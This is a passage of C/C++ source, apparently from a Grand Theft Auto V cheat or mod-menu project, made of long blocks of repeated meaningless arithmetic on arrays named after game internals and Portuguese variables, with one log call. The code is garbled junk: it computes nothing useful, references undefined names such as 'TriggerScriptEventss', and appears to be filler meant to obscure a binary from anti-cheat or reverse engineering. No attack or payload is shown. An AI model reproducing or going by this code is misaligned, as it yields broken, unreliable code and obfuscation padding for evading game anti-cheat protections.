				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<InitialHandle>777734</InitialHandle>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
